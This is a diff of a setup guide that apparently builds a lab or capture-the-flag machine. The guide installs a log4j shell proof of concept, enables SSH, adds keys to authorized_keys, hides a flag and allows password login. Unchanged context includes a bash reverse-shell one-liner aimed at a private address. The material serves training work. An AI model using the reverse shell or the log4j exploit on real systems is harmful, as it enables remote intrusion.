@@ -64,6 +64,11 @@ cd ~/mylog4j/log4j-shell-poc
 sudo apt install python3-pip
 pip install -r requirements.txt
 echo "*******log4j poc done*******"
+
+#Install ssh server
+sudo apt install openssh-server
+sudo systemctl enable --now ssh
+
 ```
 
 # Configure the James Server Phonix.sh script 
@@ -347,13 +352,20 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
 ```
 # SSH
-Generate ssh key with ssh-keygen
+* Login as one of the samba users
+* sudo su josh
+* Generate ssh key and add it to the authorized_keys
+* Create the authorized_keys file if it does not exist
+* Generate ssh key with ssh-keygen
+* Passphrase PASSPHRASE
+* Accept the default settings
+* cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+* Create hidden file and add a flag in the file.
+* Go to the ssh configuration file
+* Allow password authentication as well as key authentication
 
-Passphrase PASSPHRASE
 
-Accept the default settings
 
-cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 # References
 * https://github.com/kozmer/log4j-shell-poc
